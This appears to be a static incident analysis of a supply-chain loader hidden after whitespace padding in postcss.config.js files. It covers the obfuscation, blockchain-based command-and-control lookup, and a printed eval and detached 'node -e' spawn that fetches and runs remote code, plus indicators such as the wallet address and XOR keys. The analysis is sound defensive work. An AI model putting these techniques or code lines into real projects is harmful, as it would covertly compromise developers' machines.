# Payload Analysis — Static Only (No Execution)

## Source
Commit `1b13415` (purged) — `postcss.config.js`, `ui/postcss.config.js`, `.gitignore`
Host repo: `COMPANY-WEB` (GitHub mirror only; never reached `origin`/GitLab or production)

## Delivery
Payload appended after ~500 spaces of padding to the last line (`};`) of `postcss.config.js` and `ui/postcss.config.js`. Git reports this as a single-line change to `};` — invisible in standard diff viewers without horizontal scrolling.

## Obfuscation (Layer 1)
- `\u00xx` escaped strings throughout
- `sfL()` — deterministic Fisher-Yates shuffle reconstructing `require`, `object`, `module` from scrambled literal `"rmcej%otb%"`
- Strings stashed on `global` (`global['!']='8-3343'`) so later `eval()` scopes can access them

## Execution Chain (Layer 2)
- `"".constructor` → `Function` constructor chain (`sfL["constructor"]`)
- `Function(args, body)` executes decoded payload string — `eval` equivalent without the token
- Nested twice for layered decryption

## Blockchain C2 Resolution (Layer 3)
Hardcoded ETH wallet: `0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a`
Queries 4 public RPC endpoints in parallel (`Promise.any` + `AbortController` cleanup):
- `1rpc.io/eth`
- `eth.drpc.org`
- `ethereum-rpc.publicnode.com`
- `eth-mainnet.public.blastapi.io`
- Fallback: `eth.blockscout.com/api`

Three redundant transaction lookup strategies:
1. Probe blocks near nearest 1000-block boundary
2. Binary-search `eth_getTransactionCount` (nonce) to locate block
3. Blockscout `txlist` sorted descending

Then decodes `tx.to` (20 raw bytes) as two IPv4 addresses:
```js
const n2 = Buffer.from(tx.to.replace(/^0x/i,""), "hex");
const ip = b => b[0]+"."+b[1]+"."+b[2]+"."+b[3];
const [o, r] = [ip(n2.subarray(0,4)), ip(n2.subarray(4,8))];
```

Blockchain dead-drop: operators send one transaction; every deployed malware picks up new C2. No domain to seize. No hardcoded IP. Traffic blends into legitimate crypto developer activity.

## Payload Fetch (Layer 4)
- URLs: `http://decoded-ip>:443/0x/cls` and `/0x/ls`
- Plain HTTP on TLS port
- Headers spoof Chrome (`Mozilla/5.0 ... Chrome/131.0.0.0 ...`)
- Custom `Sec-V: A8-3343-1` header (campaign ID matching `global['!']='8-3343'`)
- XOR decryption keys: `q4FZkxX{!h,Sr3=@` (`/cls`), `y-p_>d$0B&@^1aQk` (`/ls`)
- Fallback: `HEAD` request with payload in `x-payload-b64` header

## Execution & Persistence
```js
e || eval(r + o);
spawn("node", ["-e", r + o], { detached: true, stdio: "ignore", windowsHide: true }).unref();
```
- `eval()` executes inside build process
- Detached `node -e` survives parent exit (`.unref()`)
- `windowsHide: true`, `stdio: "ignore"` — invisible

## What the Loader Does
This is a loader only. Job: find server, download code, run it. Actual theft capability is in stage 4 (fetched at runtime). What was deployed is unknown from static analysis. Posture: assume full compromise.

## Attribution Assessment
Not confirmed, but strong behavioral resemblance to DPRK-linked "Contagious Interview" / Marstech / Lazarus-adjacent clusters. Key matches: developer-targeted delivery, blockchain-resolved C2, layered obfuscation, campaign ID tracking. These loaders are copied/resold.
